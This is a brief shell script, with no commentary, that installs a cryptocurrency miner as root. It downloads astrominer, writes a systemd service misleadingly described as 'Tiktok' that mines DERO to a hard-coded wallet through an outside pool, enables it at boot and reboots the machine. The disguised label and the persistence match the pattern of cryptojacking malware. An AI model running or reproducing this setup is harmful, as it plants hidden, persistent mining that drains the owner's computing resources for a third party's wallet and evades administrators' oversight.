cd /home
sudo wget https://github.com/dero-am/astrobwt-miner/releases/download/V1.9/astrominer-V1.9_modern_amd64_linux.tar.gz
sudo apt update
sudo tar xvzf astrominer-V1.9_modern_amd64_linux.tar.gz
sudo bash -c 'echo -e "[Unit]\nDescription=Tiktok\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xedml5uvpcwtgvq6v7g32 -r community-pools.mysrv.cloud:10100\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/deroz.service'
sudo systemctl daemon-reload
sudo systemctl enable deroz.service
echo "Setup completed!"
sudo reboot
